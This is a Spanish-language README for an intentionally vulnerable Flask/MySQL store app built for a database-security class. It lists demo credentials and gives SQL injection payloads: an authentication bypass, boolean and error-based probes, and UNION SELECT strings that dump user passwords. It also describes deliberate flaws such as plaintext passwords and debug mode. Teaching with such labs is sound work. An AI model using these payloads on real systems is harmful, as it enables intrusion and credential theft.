# Sistema Vulnerable - Tienda Departamental (Demo Educativa)

⚠️ **ADVERTENCIA**: Esta aplicación fue construida **a propósito** con
vulnerabilidades de **Inyección SQL (SQL Injection)** para usarse en una
clase de ciberseguridad / seguridad en bases de datos. **No la expongas
a Internet, no la uses en producción y no reutilices este código como
base de un sistema real.**

📘 **Ejercicios guiados de inyección SQL y otras vulnerabilidades**
(incluyendo cómo extraer contraseñas sin acceder nunca a la base de
datos, stacked queries, inyección de segundo orden, IDOR, CSRF y Mass
Assignment): ver [inyection.md](inyection.md).

🛠️ **Detalle técnico de cada vulnerabilidad y su corrección** (archivo
y línea afectados, código corregido): ver
[cambios_codigo.md](cambios_codigo.md).

🎓 **Introducción para la presentación previa al laboratorio**
(historia, características, clases comunes y prevención): ver
[presentacion_sqlinjection.md](presentacion_sqlinjection.md).

## ¿Qué incluye?

- Base de datos MySQL `tienda_vulnerable` para una tienda departamental,
  con tablas: `usuarios`, `clientes`, `categorias`, `productos`,
  `ventas` y `detalle_ventas` (ver [db/schema.sql](db/schema.sql)).
- Aplicación web en **Python (Flask)** que se conecta directamente a
  MySQL mediante **PyMySQL**, con un login y varios módulos de negocio:
  - **Clientes** (incluye alta de clientes y resumen de compras)
  - **Productos**
  - **Ventas**
  - **Reportes** (vulnerable a Stacked Queries)
  - **Perfil** (vulnerable a IDOR, CSRF y Mass Assignment)
- Todas las consultas SQL se construyen **concatenando texto** en vez
  de usar consultas parametrizadas, que es precisamente el error que
  se busca enseñar a identificar. Algunos endpoints específicos (alta
  de clientes, actualización de perfil) usan consultas parametrizadas
  a propósito para enseñar otras categorías de vulnerabilidades
  (inyección de segundo orden, mass assignment) que persisten incluso
  cuando el SQL está bien escrito.
- Cuando MySQL devuelve un error de sintaxis, la aplicación **muestra
  en pantalla el código de error, el mensaje nativo del motor y la
  consulta SQL ejecutada**, tal como ocurre en sitios reales mal
  configurados (facilita el "fingerprinting" del motor de base de
  datos por parte de un atacante).

## Estructura del proyecto

```
sistemavulnerable/
├── app.py                 # Aplicación Flask (rutas vulnerables)
├── config.py               # Configuración de conexión a MySQL
├── requirements.txt         # Dependencias Python
├── db/
│   └── schema.sql           # Script de creación de la BD + datos de ejemplo iniciales
├── scriptbdtienda.sql        # Dump completo (estructura + datos actuales) para replicar la BD tal cual está hoy
├── templates/                # Vistas HTML (Bootstrap 5)
├── csrf_poc/                 # Prueba de concepto de CSRF (ver inyection.md)
└── venv/                     # Entorno virtual de Python (generado localmente)
```

## 1. Crear la base de datos

El script ya fue ejecutado contra el MySQL de pruebas indicado
(`127.0.0.1`, usuario `root`). Si necesitas recrearla desde cero:

```bash
mysql -h 127.0.0.1 -u root -p < db/schema.sql
```

Esto elimina (si existe) y vuelve a crear la base `tienda_vulnerable`
con todas las tablas y los datos de ejemplo **originales**.

### Replicar la base tal cual está actualmente

Si en vez de los datos originales quieres **replicar exactamente el
estado actual** de la base de datos (estructura y filas tal como están
en este momento en el entorno de la clase), usa en su lugar:

```bash
mysql -h 127.0.0.1 -u root -p < scriptbdtienda.sql
```

Este script (`scriptbdtienda.sql`) fue generado con `mysqldump` a
partir de la base real del proyecto y fue validado creando una base
temporal de prueba y comparando que el número de filas de cada tabla
coincida exactamente con el original (5 usuarios, 7 clientes, 5
categorías, 10 productos, 5 ventas, 8 líneas de detalle).

## 2. Preparar el entorno Python

Ya se creó un entorno virtual en `venv/` con Flask y PyMySQL
instalados. Para recrearlo manualmente:

```bash
python3 -m venv --without-pip venv
./venv/bin/python -m ensurepip --upgrade    # o usar get-pip.py si falla
./venv/bin/pip install -r requirements.txt
```

## 3. Ejecutar la aplicación

⚠️ **Importante**: el proyecto usa un entorno virtual (`venv/`) donde
están instaladas las dependencias (Flask, PyMySQL). Si ejecutas
`python app.py` o `python3 app.py` directamente (usando el Python del
sistema operativo en vez del venv), obtendrás el error
`ModuleNotFoundError: No module named 'flask'`.

Usa una de estas dos opciones:

**Opción A (recomendada): script de arranque**
```bash
./run.sh
```
Este script detecta y usa automáticamente el Python del entorno
virtual (y lo crea/instala dependencias si no existe). También solicita
la contraseña de MySQL de forma oculta si `DB_PASSWORD` no está definida.

**Opción B: invocar directamente el Python del venv**
```bash
./venv/bin/python app.py
```

**Opción C: activar el entorno virtual primero**
```bash
source venv/bin/activate
python app.py
```

La aplicación quedará disponible en `http://127.0.0.1:5000`.

Las credenciales de conexión a MySQL pueden configurarse con las
variables de entorno `DB_HOST`, `DB_PORT`, `DB_USER`, `DB_PASSWORD` y
`DB_NAME`. Por seguridad, la contraseña no está guardada en el código.
`./run.sh` la solicita automáticamente cuando hace falta.

Si inicias la aplicación directamente con Python (opciones B o C), carga
la contraseña en la terminal antes de arrancarla, sin dejarla en el
historial de comandos:

```bash
read -s -p "Contraseña MySQL: " DB_PASSWORD; echo
export DB_PASSWORD
```

## 4. Usuarios de prueba (login legítimo)

| Usuario   | Contraseña       | Rol            |
|-----------|------------------|----------------|
| admin     | Admin#2024!      | administrador  |
| gerente1  | Gerente123       | gerente        |
| cajero1   | Cajero2024       | empleado       |
| cajero2   | Clave_Cajero2    | empleado       |
| auditor   | S3cr3t0Aud!t     | auditor        |

## 5. Payloads de ejemplo para la clase

### 5.1 Bypass de autenticación (módulo Login)

La consulta vulnerable es:
```sql
SELECT * FROM usuarios WHERE nombre_usuario = '<usuario>' AND password = '<clave>'
```

En el campo **Usuario** (dejando la contraseña vacía o con cualquier valor):
```
' OR 1=1 -- -
```
Esto inicia sesión como el primer usuario de la tabla (`admin`) sin
conocer la contraseña real.

Para generar un error de sintaxis y ver el mensaje nativo de MySQL,
basta con escribir una comilla simple suelta, por ejemplo en el campo
usuario:
```
admin'
```

### 5.2 Fuga de datos vía error (módulo Productos)

El filtro `id` se concatena en un contexto **numérico** (sin comillas):
```sql
WHERE p.id = <id>
```

- `http://127.0.0.1:5000/productos?id=0 OR 1=1` → muestra todos los
  productos (bypass de filtro / boolean-based).
- `http://127.0.0.1:5000/productos?id=abc` → provoca el error de MySQL
  `Unknown column 'abc' in 'where clause'`, revelando que el motor es
  MySQL.

### 5.3 UNION-based SQL Injection (módulo Clientes)

El buscador de clientes proyecta 7 columnas, el mismo número de
columnas que la tabla `usuarios`, lo que permite extraer usuarios y
contraseñas directamente desde la búsqueda. En el campo de búsqueda:

```
' UNION SELECT id, nombre_usuario, password, nombre_completo, rol, email, fecha_creacion FROM usuarios -- -
```

### 5.4 UNION-based SQL Injection (módulo Ventas)

El buscador de ventas por cliente también es vulnerable y proyecta 5
columnas:

```
' UNION SELECT id, CONCAT(nombre_usuario,':',password), NOW(), 0, rol FROM usuarios -- -
```

## 6. Qué mostrar en clase

1. **Reconocimiento (fingerprinting)**: provocar un error con una
   comilla simple (`'`) y mostrar cómo el mensaje de error revela que
   el motor es MySQL, junto con el código de error y la consulta
   exacta que se ejecutó.
2. **Bypass de autenticación**: iniciar sesión sin credenciales
   válidas usando `' OR 1=1 -- -`.
3. **Extracción de datos sensibles**: usar UNION SELECT para dumpear
   usuarios y contraseñas desde un módulo que, en apariencia, solo
   permite buscar clientes o ventas.
4. **La corrección**: explicar que el problema es concatenar la
   entrada del usuario dentro del SQL, y que la solución es usar
   **consultas parametrizadas** (placeholders `%s` con PyMySQL) en
   lugar de construir el SQL con `+` o f-strings, además de aplicar el
   principio de mínimo privilegio en la cuenta de base de datos y
   deshabilitar mensajes de error detallados en producción.

## Notas de seguridad (por qué NO usar esto en producción)

- Las contraseñas se almacenan en **texto plano** (sin hash).
- Las consultas SQL se construyen por **concatenación de cadenas**.
- Los errores de MySQL se muestran **sin sanitizar** al usuario final.
- La aplicación corre con `debug=True` (expone el debugger de Werkzeug).
- La clave de sesión de Flask está fija en el código.

Todo esto es intencional para la demostración. En un sistema real cada
uno de estos puntos debe corregirse.
